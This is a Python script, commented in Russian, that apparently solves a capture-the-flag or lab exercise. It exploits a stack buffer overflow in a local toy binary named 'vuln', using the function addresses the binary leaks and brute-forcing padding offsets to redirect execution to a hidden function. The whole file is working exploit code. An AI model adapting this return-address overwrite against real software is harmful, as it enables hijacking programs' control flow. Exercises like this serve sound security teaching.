#!/usr/bin/env python3
import subprocess
import struct
import re
import sys
import time

# Функция для получения адресов функций
def get_function_addresses():
    # Запускаем процесс без ввода данных
    process = subprocess.Popen(
        ["./vuln"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Читаем первые строки вывода
    output = ""
    for _ in range(5):  # Ожидаем 5 строк
        output += process.stdout.readline()
    
    # Закрываем процесс
    process.stdin.write("\n")
    process.stdin.flush()
    process.terminate()
    
    # Ищем адреса в выводе
    secret_match = re.search(r"secret function: (0x[0-9a-f]+)", output)
    another_match = re.search(r"another_secret function: (0x[0-9a-f]+)", output)
    
    if secret_match and another_match:
        secret_addr = int(secret_match.group(1), 16)
        another_addr = int(another_match.group(1), 16)
        return secret_addr, another_addr
    else:
        print("[-] Не удалось найти адреса функций")
        return None, None

# Функция для создания эксплойта
def create_exploit(target_addr, offset, filename="exploit_input"):
    payload = b"A" * offset
    payload += struct.pack("<Q", target_addr)  # 8 байт для 64-битного адреса
    
    with open(filename, "wb") as f:
        f.write(payload)
    
    return payload

# Функция для запуска эксплойта
def run_exploit(filename="exploit_input"):
    try:
        result = subprocess.run(
            ["./vuln"], 
            input=open(filename, "rb").read(),
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            timeout=1
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return b"Timeout"

def main():
    # Получаем адреса функций
    secret_addr, another_addr = get_function_addresses()
    
    if not secret_addr or not another_addr:
        print("Не удалось получить адреса. Выход.")
        sys.exit(1)
    
    print(f"[+] Адрес secret: 0x{secret_addr:x}")
    print(f"[+] Адрес another_secret: 0x{another_addr:x}")
    
    # Пробуем разные смещения
    for offset in range(72, 96, 4):
        print(f"\n[*] Пробуем смещение: {offset}")
        
        # Создаем эксплойт нацеленный на another_secret
        create_exploit(another_addr, offset)
        
        # Запускаем эксплойт
        output = run_exploit()
        
        # Проверяем результат
        if b"Another secret function accessed!" in output:
            print(f"[+] Успешно! Получили доступ к another_secret с offset={offset}")
            print(f"[+] Содержимое вывода:")
            print(output.decode())
            
            # Сохраняем успешный эксплойт
            with open("successful_exploit", "wb") as f:
                f.write(open("exploit_input", "rb").read())
            
            print(f"[+] Успешный эксплойт сохранен в файле 'successful_exploit'")
            return
        elif b"Segmentation fault" in output or b"Bus error" in output:
            print(f"[*] Сегментация / Ошибка шины с offset={offset}")
        else:
            print(f"[*] Нет успеха с offset={offset}")
    
    print("\n[-] Не удалось найти работающий эксплойт.")

if __name__ == "__main__":
    main() 